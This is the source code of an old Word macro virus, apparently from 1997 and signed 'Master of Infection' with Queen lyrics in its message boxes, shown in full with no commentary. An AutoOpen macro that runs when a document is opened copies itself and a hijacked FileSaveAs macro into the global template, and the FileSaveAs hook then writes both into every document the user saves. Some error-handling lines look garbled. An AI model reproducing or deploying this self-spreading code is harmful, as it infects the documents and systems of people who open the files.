   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   '(c) 1997 Master of Infection
   'QUEEN FOREVER!!!
   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   WordBasic.Dialog.FileSaveAs n
   If n.Format <> 1 Then n.Format = 1
   namef$ = WordBasic.[WindowName$](0) + ":AutoOpen"
   named$ = "Global" + ":AutoOpen"
   namefa$ = WordBasic.[WindowName$](0) + ":FileSaveAs"
   nameda$ = "Global" + ":FileSaveAs"
   WordBasic.MacroCopy nameda$, namefa$  ', - 1  Delete "'" to close Macro!
   WordBasic.MacroCopy named$, namef$  ', - 1 -------------||----------
   WordBasic.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   Err.Number:
   WordBasic.MsgBox "You can come along...You can come along...Come to ogre battle!", "Track 6", 16
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "(c) 1997 Master of infection\r\nQUEEN FOREVER!\r\nDedicated to the immortal spirit of Freddie Mecrury"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   '(c) 1997 Master of Infection
   'QUEEN FOREVER!!!
   namef$ = WordBasic.[WindowName$](0) + ":AutoOpen"
   named$ = "Global" + ":AutoOpen"
   namefa$ = WordBasic.[WindowName$](0) + ":FileSaveAs"
   nameda$ = "Global" + ":FileSaveAs"
   On Error GoTo -1: On Error GoTo ccc
   If WordBasic.[MacroName$](1, 0) = "FileSaveAs" Then GoTo cont
   ccc:
   WordBasic.MacroCopy namefa$, nameda$   ', - 1 Delete "'" to close Macro!
   WordBasic.MacroCopy namef$, named$
   Goto err.Number
   On Error Goto -1 : On Error Goto err.Number
   cont:
   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   n.Format = 1
   Rem n.Name = WindowName$(0)
   Rem If MacroName$(0) = "AutoOpen" Then Goto err
   WordBasic.MacroCopy nameda$, namefa$   ', - 1 Delete "'" to close
   WordBasic.MacroCopy named$, namef$  ', - 1 ------------||-----------
   WordBasic.FileSaveAs n
   Goto err.Number
   Err.Number:
   WordBasic.MsgBox "Now once upon a time An old man told me a fable ", " Track 6 ", 16
   End Sub
